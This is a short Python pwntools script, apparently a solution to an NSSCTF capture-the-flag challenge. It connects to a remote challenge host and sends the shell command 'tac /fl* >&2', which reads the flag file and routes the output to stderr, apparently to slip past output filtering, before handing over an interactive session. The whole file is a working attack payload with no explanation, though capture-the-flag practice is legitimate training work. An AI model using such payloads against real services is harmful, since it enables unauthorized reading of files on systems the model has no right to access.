from pwn import *

#io = process("./nc")
io = remote("node4.anna.nssctf.cn", 25029)

payload = b"tac /fl* >&2"

io.sendline(payload)

io.interactive()
